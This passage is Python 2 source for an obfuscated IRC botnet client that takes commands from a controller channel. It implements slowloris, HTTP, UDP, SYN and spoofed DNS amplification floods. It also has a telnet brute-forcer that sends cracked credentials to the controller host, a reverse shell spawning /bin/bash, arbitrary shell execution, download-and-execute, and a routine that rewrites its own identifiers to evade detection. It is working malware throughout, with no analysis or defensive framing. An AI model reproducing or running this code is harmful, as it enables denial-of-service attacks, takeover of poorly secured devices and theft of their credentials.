            if self.AELmEnMe == 1:
                break
            for QBQtdKIm in xrange(0, int(sockets)):
                if self.AELmEnMe == 1:
                    break
                fds[QBQtdKIm] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                try:
                    fds[QBQtdKIm].connect((gSRaQsAT, int(ekAcxzEz)))
                except:
                    pass
            PGRzbfUd = "GET / HTTP/1.1\nHost: %s:%s\nUser-agent: %s\nAccept: */*\nConnection: Keep-Alive\n\n" % (gSRaQsAT, ekAcxzEz, random.choice(self.GbASkEbE))
            for nHrRZUKk in PGRzbfUd:
                if self.AELmEnMe == 1:
                    break
                for fd in fds:
                    try:
                        fd.send(nHrRZUKk)
                        self.gLsaWmlh+=1
                    except:
                        try:
                            fd.connect((gSRaQsAT, int(ekAcxzEz)))
                        except:
                            pass
                if IWNKrdcU<time.time():
                    for fd in fds:
                        try:
                            fd.close()
                        except:
                            pass
                    return
                time.sleep(1)
                self.gLsaWmlh = 0
        self.AbJppCRv.send("PRIVMSG %s :Made %s connections.\n" % (self.lAyMzJrw,self.gLsaWmlh))
        self.gLsaWmlh=0
    def sMTJQLQX(self,bZtHOlSl):
        try:
            opener = urllib2.build_opener()
            opener.addheaders = [('User-agent', random.choice(self.GbASkEbE))]
            return opener.open(bZtHOlSl).read()
        except:
            return ""
    def UYUnLint(self,url,XusYRFMu,recursive):
        if recursive=="true":
            IWNKrdcU=time.time()+XusYRFMu
            while IWNKrdcU>time.time():
                if self.AELmEnMe == 1:
                    break
                for TDibPNtf in re.findall('''href=["'](.[^"']+)["']''',self.sMTJQLQX(url), re.I):
                    if self.AELmEnMe == 1:
                        break
                    self.sMTJQLQX(TDibPNtf)
                for TDibPNtf in re.findall('''src=["'](.[^"']+)["']''',self.sMTJQLQX(url), re.I):
                    if self.AELmEnMe == 1:
                        break
                    self.sMTJQLQX(TDibPNtf)
                        
        else:
            IWNKrdcU=time.time()+XusYRFMu
            while IWNKrdcU>time.time():
                if self.AELmEnMe == 1:
                    break
                self.sMTJQLQX(url)
    def CUhKIvCh(self,WZvOEFyC,EoVtvYCA,CrdOwtNy):
        self.AbJppCRv.send("PRIVMSG %s :Scanning range %s for port %s, scanning for telnet? %s\n" % (self.lAyMzJrw,WZvOEFyC,EoVtvYCA,CrdOwtNy))
        for awRLHHhl in self.ANoRqMAc(WZvOEFyC):
            try:
                if self.AELmEnMe == 1:
                    return
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((awRLHHhl,int(EoVtvYCA))) #Make sure EBcZqJni is up and port is open.
                s.close()
                if CrdOwtNy == "true" or CrdOwtNy == "1":
                    username = ""
                    password = ""
                    cracked = False
                    for passwd in combo:
                        if cracked:
                            break
                        if ":n/a" in passwd:
                            password=""
                        else:
                            password=passwd.split(":")[1]
                        if "n/a:" in passwd:
                            username=""
                        else:
                            username=passwd.split(":")[0]
                        try:
                            tn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            tn.settimeout(0.5)
                            tn.connect((self.ip, 23))
                        except Exception:
                            try:
                                tn.close()
                            except:
                                pass
                            break
                        try:
                            hoho = ''
                            hoho += readUntil(tn, ":")
                            if ":" in hoho:
                                tn.send(username + "\n")
                                time.sleep(0.1)
                            hoho = ''
                            hoho += readUntil(tn, ":")
                            if ":" in hoho:
                                tn.send(password + "\n")
                                time.sleep(0.8)
                            else:
                                pass
                            prompt = ''
                            prompt += tn.recv(8912)
                            if ">" in prompt and "ONT" not in prompt:
                                success = True
                            elif "#" in prompt or "$" in prompt or "root@" in prompt or ">" in prompt:
                                success = True
                            else:
                                tn.close()
                            if success == True:
                                try:
                                    print "\033[32m[\033[31m+\033[32m] \033[33mGOTCHA \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m"%(username, password, self.ip)
                                    cracked = True
                                    fh.write(self.ip + ":23 " + username + ":" + password + "\n")
                                    fh.flush()
                                    tn.send("sh\r\n")
                                    time.sleep(0.1)
                                    tn.send("shell\r\n")
                                    time.sleep(0.1)
                                    tn.send("ls /\r\n")
                                    time.sleep(1)
                                    timeout = 8
                                    buf = ''
                                    start_time = time.time()
                                    while time.time() - start_time < timeout:
                                        buf += recvTimeout(tn, 8912)
                                        time.sleep(0.1)
                                        if "bin" in buf and "unrecognized" not in buf:
                                            self.AbJppCRv.send("PRIVMSG %s :%s:%s %s:%s\n" % (self.lAyMzJrw,awRLHHhl,EoVtvYCA,username,password))
                                            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                            s.connect((self.YxqCRypO, 8080))
                                            s.send(self.ip + ":23 " + username + ":" + password + "\n")
                                            s.close()
                                            f = open("telnetz.txt", "a")
                                            f.write(self.ip + ":23 " + username + ":" + password + "\n")
                                            f.close()
                                            tn.close()
                                            break
                                    
                                    break
                                except:
                                    pass
                        except Exception:
                            pass
                self.AbJppCRv.send("PRIVMSG %s :%s\n" % (self.lAyMzJrw,awRLHHhl))
            except:
                pass
        self.AbJppCRv.send("PRIVMSG %s :Finished scanning range %s\n" % (self.lAyMzJrw,WZvOEFyC))
    def DDoS(self, target, threads, domains, timee):
        self.target = target
        self.threads = threads
        self.timeend = time.time()+timee
        self.domains = domains
        for i in range(self.threads):
            t = threading.Thread(target=self.__attack)
            t.start()
    def __send(self, sock, soldier, proto, payload):
        udp = UDP(random.randint(1, 65535), PORT[proto], payload).pack(self.target, soldier)
        ip = IP(self.target, soldier, udp, proto=socket.IPPROTO_UDP).pack()
        sock.sendto(ip+udp+payload, (soldier, PORT[proto]))
    def __GetQName(self, domain):
        labels = domain.split('.')
        QName = ''
        for label in labels:
            if len(label):
                QName += pack('B', len(label)) + label
        return QName
    def __GetDnsQuery(self, domain):
        id = pack('H', random.randint(0, 65535))
        QName = self.__GetQName(domain)
        return PAYLOAD['dns'].format(id, QName)
    def __attack(self):
        global proto
        global npackets
        global nbytes
        _files = files
        for proto in _files:    # Open Amplification files
            f = open(_files[proto][FILE_NAME], 'r')
            _files[proto].append(f)        # _files = {'proto':['file_name', file_handle]}
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        i = 0
        while 1:
            try:
                if time.time()>=self.timeend or self.AELmEnMe == 1:
                    break
                soldier = _files[proto][FILE_HANDLE].readline().strip()
                if soldier:
                    if proto=='dns':
                        if not amplification[proto].has_key(soldier):
                            amplification[proto][soldier] = {}
                        for domain in self.domains:
                            amp = self.__GetDnsQuery(domain)
                            self.__send(sock, soldier, proto, amp)
                    else:
                        amp = PAYLOAD[proto]
                        self.__send(sock, soldier, proto, amp)
                else:
                    _files[proto][FILE_HANDLE].seek(0)
            except:
                pass
        try:
            sock.close()
            for proto in _files:
                _files[proto][FILE_HANDLE].close()
        except:
            pass
    def reverseShell(self, ip, port):
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((ip, int(port)));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")
    def shell_(self, cmd):
        try:
            process = subprocess.Popen(cmd,stdout=subprocess.PIPE,shell=True)
            while True:
                output = process.stdout.readline()
                if process.poll() is not None and output == '':
                    break
                if output:
                    self.AbJppCRv.send("PRIVMSG %s :%s\n" % (self.lAyMzJrw,output.strip()))
        except Exception as e:
            print str(e)
            self.AbJppCRv.send("PRIVMSG %s :Failed to execute command.\n" % self.lAyMzJrw)
    def nIZlsIEI(self):
        global pause
        OPHIPOCv=""
        self.AbJppCRv=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.AbJppCRv.connect((self.YxqCRypO, self.EQGAKLwR))
        qsPrHtiu = 0
        self.AbJppCRv.send("NICK %s\n" % self.hLqhZnCt)
        self.AbJppCRv.send("USER %s %s localhost :%s\n" % (self.aRHRPteL, self.YxqCRypO, self.pBYbuWVq))
        while 1:
            try:
                OPHIPOCv=OPHIPOCv+self.AbJppCRv.recv(1024)
                dbOkhWET=OPHIPOCv.split("\n")
                OPHIPOCv=dbOkhWET.pop( )
                for self.FvHtFbef in dbOkhWET:
                    self.FvHtFbef=self.FvHtFbef.rstrip()
                    self.FvHtFbef=self.FvHtFbef.split()
                    if(self.FvHtFbef[0]=="PING"):
                        self.AbJppCRv.send("PONG %s\n" % self.FvHtFbef[1])
                    elif(self.FvHtFbef[1]=="376" or self.FvHtFbef[1]=="422" or self.FvHtFbef[1]=="352"):
                        if qsPrHtiu == 0:
                            self.AbJppCRv.send("JOIN %s %s\n" % (self.lAyMzJrw,self.TbdfKqvM))
                            qsPrHtiu = 1
                    elif(self.FvHtFbef[1]=="433"):
                        self.VwkBkdwM=self.BrtcGnmw(random.randrange(8,12))
                        self.hLqhZnCt="[HAX|"+platform.system()+"|"+platform.machine()+"|"+str(multiprocessing.cpu_count())+"]"+str(self.VwkBkdwM) #Bot nickname
                        self.AbJppCRv.send("NICK %s\n" % self.hLqhZnCt)
                try:
                    if self.FvHtFbef[3]==":.udpflood":
                        self.AbJppCRv.send("PRIVMSG %s :Started UDP flood on %s:%s\n" % (self.lAyMzJrw,self.FvHtFbef[4],self.FvHtFbef[5]))
                        threading.Thread(target=self.YQYZpxFe,args=(self.FvHtFbef[4],int(self.FvHtFbef[5]),int(self.FvHtFbef[6]),)).start()
                    elif self.FvHtFbef[3]==":.synflood":
                        self.AbJppCRv.send("PRIVMSG %s :Started SYN flood on %s:%s with %s threads\n" % (self.lAyMzJrw,self.FvHtFbef[4],self.FvHtFbef[5],self.FvHtFbef[7]))
                        for i in range(0, int(self.FvHtFbef[7])):
                            threading.Thread(target=self.oBwjfHGs,args=(self.FvHtFbef[4],int(self.FvHtFbef[5]),int(self.FvHtFbef[6],))).start()
                    elif self.FvHtFbef[3]==":.slowloris":
                        self.AbJppCRv.send("PRIVMSG %s :Started Slowloris on %s with %s sockets\n" % (self.lAyMzJrw,self.FvHtFbef[4],self.FvHtFbef[5]))
                        threading.Thread(target=self.UDilxaOf,args=(self.FvHtFbef[4],int(self.FvHtFbef[5]),int(self.FvHtFbef[6],))).start()
                    elif self.FvHtFbef[3]==":.httpflood":
                        self.AbJppCRv.send("PRIVMSG %s :Started HTTP flood on URL: %s with %s threads\n" % (self.lAyMzJrw,self.FvHtFbef[4],self.FvHtFbef[7]))
                        for i in range(0, int(self.FvHtFbef[7])):
                            threading.Thread(target=self.UYUnLint,args=(self.FvHtFbef[4],int(self.FvHtFbef[5]),self.FvHtFbef[6],)).start()
                    elif self.FvHtFbef[3]==":.loadamp":
                        self.AbJppCRv.send("PRIVMSG %s :Downloading %s list from %s\n" % (self.lAyMzJrw,self.FvHtFbef[4],self.FvHtFbef[5]))
                        urllib.urlretrieve(self.FvHtFbef[5], "."+self.FvHtFbef[4])
                    elif self.FvHtFbef[3]==":.amp":
                        try:
                            if not os.path.exists("."+self.FvHtFbef[4]):
                                self.AbJppCRv.send("PRIVMSG %s :Please load this type of amp list first.\n" % (self.lAyMzJrw))
                                continue
                            domains="netflix.com,youtube.com,facebook.com,google.com,yahoo.com".split(",")
                            proto = self.FvHtFbef[4]
                            if self.FvHtFbef[4] == "dns":
                                try:
                                    domains = self.FvHtFbef[8].split(",")
                                except:
                                    pass
                            files[self.FvHtFbef[4]] = ["."+self.FvHtFbef[4]]
                            self.AbJppCRv.send("PRIVMSG %s :Started %s amp flood on %s\n" % (self.lAyMzJrw,self.FvHtFbef[4],self.FvHtFbef[5]))
                            self.DDoS(socket.gethostbyname(self.FvHtFbef[5]), int(self.FvHtFbef[6]), domains, int(self.FvHtFbef[7]))
                        except:
                            pass
                    elif self.FvHtFbef[3]==":.scannetrange":
                        threading.Thread(target=self.CUhKIvCh,args=(self.FvHtFbef[4],self.FvHtFbef[5],self.FvHtFbef[6],)).start()
                    elif self.FvHtFbef[3]==":.revshell":
                        threading.Thread(target=self.reverseShell, args=(self.FvHtFbef[4],self.FvHtFbef[5],)).start()
                    elif self.FvHtFbef[3]==":.shell":
                        threading.Thread(target=self.shell_,args=(" ".join(self.FvHtFbef[4:]),)).start()
                    elif self.FvHtFbef[3]==":.repack":
                        self.KYuhkvIx()
                        self.AbJppCRv.send("PRIVMSG %s :Repacked code!\n" % (self.lAyMzJrw))
                    elif self.FvHtFbef[3]==":.download":
                        try:
                            urllib.urlretrieve(self.FvHtFbef[4],self.FvHtFbef[5])
                            self.AbJppCRv.send("PRIVMSG %s :Downloaded.\n" % (self.lAyMzJrw))
                        except:
                            self.AbJppCRv.send("PRIVMSG %s :Could not download!\n" % (self.lAyMzJrw))
                    elif self.FvHtFbef[3]==":.execute":
                        try:
                            urllib.urlretrieve(self.FvHtFbef[4],self.FvHtFbef[5])
                            if not platform.System.startswith("Windows"):
                                try:
                                    os.chmod(self.FvHtFbef[5], 0777)
                                except:
                                    pass
                            subprocess.Popen([("%s" % self.FvHtFbef[5])])
                            self.AbJppCRv.send("PRIVMSG %s :Downloaded and executed.\n" % (self.lAyMzJrw))
                        except:
                            self.AbJppCRv.send("PRIVMSG %s :Could not download or execute!\n" % (self.lAyMzJrw))
                    elif self.FvHtFbef[3]==":.killbyname":
                        os.popen("pkill -f %s" % self.FvHtFbef[4])
                        self.AbJppCRv.send("PRIVMSG %s :Killed.\n" % (self.lAyMzJrw))
                    elif self.FvHtFbef[3]==":.killbypid":
                        os.kill(int(self.FvHtFbef[4]),9)
                        self.AbJppCRv.send("PRIVMSG %s :Killed.\n" % (self.lAyMzJrw))
                    elif self.FvHtFbef[3]==":.killall":
                        self.AELmEnMe=1
                    elif self.FvHtFbef[3]==":.resume":
                        self.AELmEnMe=0
                    elif self.FvHtFbef[3]==":.sniffer-resume":
                        if platform.system() != "Windows":
                            pause=0
                            self.AbJppCRv.send("PRIVMSG %s :Sniffer resumed!\n" % (self.lAyMzJrw))
                    elif self.FvHtFbef[3]==":.sniffer-pause":
                        if platform.system() != "Windows":
                            pause=1
                            self.AbJppCRv.send("PRIVMSG %s :Sniffer paused!\n" % (self.lAyMzJrw))
                    elif self.FvHtFbef[3]==":.getip":
                        self.AbJppCRv.send("PRIVMSG %s :%s\n" % (self.lAyMzJrw,urllib2.urlopen("https://api.ipify.org").read()))
                    elif self.FvHtFbef[3]==":.ram":
                        meminfo = dict((i.split()[0].rstrip(':'),int(i.split()[1])) for i in open('/proc/meminfo').readlines())
                        mem_kib = meminfo['MemTotal']  # e.g. 3921852
                        self.AbJppCRv.send("PRIVMSG %s :%s MB RAM total.\n" % (self.lAyMzJrw, mem_kib/1024))
                    elif self.FvHtFbef[3]==":.killmyeyepeeusinghoic":
                       os.kill(os.getpid(),9)
                except IndexError or TypeError:
                    pass
            except:
                break
    def KYuhkvIx(self):
        try:
            nqOdGnmK=open(argv[0],"r")
            AMgOvMSc=nqOdGnmK.read()
            nqOdGnmK.close()
            SofMrXFR=['pBYbuWVq','BrtcGnmw','BrtcGnmw','aeRiqAnI','nIZlsIEI','EQGAKLwR','UDilxaOf','dAGtjnII','dajsJgBT','mKxjSTWt','XUbvPqib','YQYZpxFe','aRHRPteL','YxqCRypO','EBcZqJni','VwkBkdwM','lAyMzJrw','gLsaWmlh','hLqhZnCt','SofMrXFR','OqgVpLci','nqOdGnmK','DedQhuIn','GUuYPraX','KYuhkvIx','oBwjfHGs','OxYXMYUq','AbJppCRv','IWNKrdcU','EoVtvYCA','IWNKrdcU','XusYRFMu','OHCdSBTA','dbOkhWET','TbdfKqvM','AMgOvMSc','OPHIPOCv','YaygKIoM','TDibPNtf','wnIyumGy','TIQbeSkZ','YqlwXkhL','YFdZsLbL','sMTJQLQX','bZtHOlSl','ANoRqMAc','WpjVvTYm','oFbPxKRo','dptPYiDu','VIxrvTxU','nbmfZmAQ','UgzNfBje','EBBLQWww','awRLHHhl','UYUnLint','CUhKIvCh','WZvOEFyC','JievZqHJ','FvHtFbef','sHuYmKLE','enqsLbSu','IqTGMTaJ','nhxpRfXp','pAbhrcGT','QDnHQWVs','ZZfssPgT','gXgZkwrT','YKRNiMvl','cuXEgMJc','CfvgTJpZ','pcqasaZK','ayapRZGx','ZZfssPgT','LsSAmQyi', 'CrdOwtNy', 'qsPrHtiu', 'PGRzbfUd', 'gSRaQsAT', 'nHrRZUKk','QBQtdKIm', 'ekAcxzEz']
            for OqgVpLci in SofMrXFR:
                AMgOvMSc=AMgOvMSc.replace(OqgVpLci,self.BrtcGnmw(8))
            DedQhuIn=open(argv[0],"w")
            DedQhuIn.write(AMgOvMSc)
            DedQhuIn.close()
        except:
            pass
if __name__=="__main__":
    for proc in os.listdir("/proc"):
        try:
            fh=open("/proc/"+proc+"/cmdline", "rb")
            cmdline=fh.read()
            fh.close()
            # 判断自身out.py是否已运行
            if os.path.basename(__file__) in cmdline and int(proc) != os.getpid():
                exit(1)
        except:
            pass
    while 1:
        try:
            aeRiqAnI()
        except:
            time.sleep(45)
